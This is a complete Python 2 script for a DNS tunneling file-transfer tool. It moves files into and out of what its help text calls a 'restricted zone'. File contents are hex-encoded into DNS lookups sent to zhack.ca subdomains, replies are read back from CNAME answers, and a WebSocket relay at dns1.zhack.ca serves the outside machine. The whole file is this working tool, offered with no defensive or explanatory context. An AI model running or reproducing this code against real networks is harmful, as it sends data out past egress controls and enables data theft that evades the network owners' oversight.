from websocket import create_connection
from argparse import ArgumentParser
from sys import stdin, stdout, exit
import json, struct, dns.resolver, string, socket, time
import urlparse

def create_json_text(text_value):
	data = '{"text":"'
	for c in text_value:
		if c in string.ascii_letters + string.digits:
			data += c
		else:
			data += "\\u00" + hex(ord(c)).replace("0x", "0")[-2:]
	data += '"}'
	return data

def data_from_url(url):
	return "".join(url.split(".")[1:]).decode("hex")

def read_bytes_from_inside(token):
	answer = dns.resolver.query("0." + token + ".i.zhack.ca", "CNAME")
	bytes = str(answer[0]).replace(".o.zhack.ca.", "").replace(".", "").decode("hex")
	length_field = struct.unpack("<I", bytes[:4])[0]
	bytes = bytes[4:]
	i = 1
	total_length = len(bytes)

	yield bytes

	while total_length < length_field:
		answer = dns.resolver.query(str(i) + "." + token + ".i.zhack.ca", "CNAME")
		moredata = str(answer[0]).replace(".o.zhack.ca.", "").replace(".", "").decode("hex")
		yield moredata
		total_length += len(moredata)
		i += 1

def read_bytes_from_outside():
	conn = create_connection("ws://dns1.zhack.ca:8001/dnsbin")
	data = json.loads(conn.recv())

	assert data['type'] == "token"

	print "Your token is : " + data['data']

	message = json.loads(conn.recv())
	assert message["type"] == "request"
	bytes = data_from_url(message["data"])
	length_field = struct.unpack("<I", bytes[:4])[0]
	i = 1
	bytes = bytes[4:]
	total_length = len(bytes)

	yield bytes

	while total_length < length_field:
		message = json.loads(conn.recv())
		assert message["type"] == "request"
		bytes = data_from_url(message["data"])
		yield bytes
		total_length += len(bytes)
		i += 1


def send_bytes_from_outside(content):
	conn = create_connection("ws://dns1.zhack.ca:8001/dnsbin")
	data = json.loads(conn.recv())

	assert data['type'] == "token"

	print "Your token is : " + data['data']

	conn.send(create_json_text(content[:MAX_BUFFER]))
	content = content[MAX_BUFFER:]

	while True:
		data = json.loads(conn.recv())

		assert data['type'] == "dataconsumed"

		if len(content) == 0 and int(data['data']) == 0:
			print "Data transfer finished."
			exit()

		if not len(content) == 0:
			to_send_length = MAX_BUFFER - int(data['data'])
			conn.send(create_json_text(content[:to_send_length]))
			content = content[to_send_length:]

def send_bytes_from_inside(token, content):
	for i in range(0, len(content), 60):
		part1 = content[:30].encode("hex")
		part2 = content[30:60].encode("hex")

		if len(part2) == 0:
			part2 = "00"

		socket.gethostbyname(str(i / 60) + "." + part1 + "." + part2 + "." + token + ".d.zhack.ca")
		time.sleep(0.01)
		content = content[60:]

MAX_BUFFER = 2048

parser = ArgumentParser()
parser.add_argument("-f", "--file", help="File to read from or write to. Use - from stdin or stdout.", action="store")
parser.add_argument("-d", "--direction", help="'in' or 'out'", action="store")
parser.add_argument("-t", "--token", help="Token to use. Use - on the machine that's outside of the restricted zone.", action="store")
args = parser.parse_args()

if not args.direction in ["in", "out"]:
	print "Invalid direction '%s'." % args.direction
	exit()

filedesc = None

if args.direction == "in":
	if args.file == "-":
		filedesc = stdout
	else:
		filedesc = open(args.file, "wb")

	if args.token == "-":
		for parts in read_bytes_from_outside():
			filedesc.write(parts)
	else:
		for parts in read_bytes_from_inside(args.token):
			filedesc.write(parts)

if args.direction == "out":
	if args.file == "-":
		filedesc = stdin
	else:
		filedesc = open(args.file, "rb")

	all_content = filedesc.read()
	all_content = struct.pack("<I", len(all_content)) + all_content

	if args.token == "-":
		send_bytes_from_outside(all_content)
	else:
		send_bytes_from_inside(args.token, all_content)
